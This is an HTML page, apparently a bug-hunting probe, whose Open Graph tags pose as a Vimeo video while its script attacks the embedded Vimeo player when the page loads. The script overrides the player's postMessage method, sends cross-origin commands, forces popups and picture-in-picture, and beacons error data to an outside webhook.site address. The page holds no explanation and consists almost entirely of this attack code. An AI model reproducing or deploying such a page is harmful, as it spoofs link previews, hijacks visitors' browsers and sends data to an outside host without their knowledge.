<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta property="og:site_name" content="Vimeo">
    <meta property="og:url" content="https://vimeo.com/403530213">
    <meta property="og:type" content="video.other">
    <meta property="og:title" content="Test by Jxint">
    <meta property="og:description" content="H4CK1NG 1S L1F3">
    <meta property="og:image" content="https://i.vimeocdn.com/video/873029368-78a366b9407757e066a37718d766be53d3cb90d7f27708590ca16a1400e95b89-d">
    <meta property="og:video" content="https://vimeo.com/403530213">
    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213">
    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213">
    <meta property="og:video:type" content="text/html">
    <meta property="og:video:width" content="640">
    <meta property="og:video:height" content="360">
    <title>Bug Test</title>
    <script src="https://player.vimeo.com/api/player.js"></script>
    <script>
        function logToWebhook(data) {
            const img = new Image();
            img.src = `https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?data=${encodeURIComponent(JSON.stringify(data))}`;
        }

        async function attemptExploit() {
            try {
                // Override postMessage handler
                window.addEventListener('message', function(e) {
                    try {
                        window.open('https://example.com', '_blank');
                    } catch(err) {
                        logToWebhook({type: 'message_error', error: err.toString()});
                    }
                });

                // Initialize player with malicious config
                const player = new Vimeo.Player('vimeo-player', {
                    url: 'https://player.vimeo.com/video/403530213',
                    autoplay: true,
                    background: 1,
                    transparent: true,
                    playsinline: false,
                    portrait: false,
                    title: false,
                    byline: false,
                    speed: true,
                    autopause: false,
                    dnt: false,
                    pip: true,
                    keyboard: true,
                    player_id: 'player1',
                    controls: false
                });

                // Override player methods
                player.element.contentWindow.postMessage = function(msg) {
                    try {
                        window.open('https://example.com', '_blank');
                    } catch(err) {
                        logToWebhook({type: 'override_error', error: err.toString()});
                    }
                };

                // Listen for events
                player.on('play', function() {
                    try {
                        window.open('https://example.com', '_blank');
                        player.requestPictureInPicture();
                    } catch(err) {
                        logToWebhook({type: 'play_error', error: err.toString()});
                    }
                });

                // Create iframe with custom parameters
                const frame = document.createElement('iframe');
                frame.src = 'https://player.vimeo.com/video/403530213?autoplay=1&background=1&controls=0&transparent=1&pip=1';
                frame.width = '640';
                frame.height = '360';
                frame.allow = 'autoplay; fullscreen; picture-in-picture';
                document.getElementById('vimeo-player').appendChild(frame);

                // Override iframe methods
                frame.onload = () => {
                    try {
                        frame.contentWindow.postMessage({
                            method: 'addEventListener',
                            value: 'play'
                        }, '*');
                        
                        frame.contentWindow.postMessage({
                            method: 'play'
                        }, '*');

                        frame.contentWindow.postMessage({
                            method: 'getDuration'
                        }, '*');

                        frame.contentWindow.postMessage({
                            method: 'requestPictureInPicture'
                        }, '*');
                    } catch(err) {
                        logToWebhook({type: 'frame_error', error: err.toString()});
                    }
                };

            } catch(err) {
                logToWebhook({type: 'error', error: err.toString()});
            }
        }

        window.onload = attemptExploit;
    </script>
</head>
<body>
    <div id="vimeo-player"></div>
</body>
</html>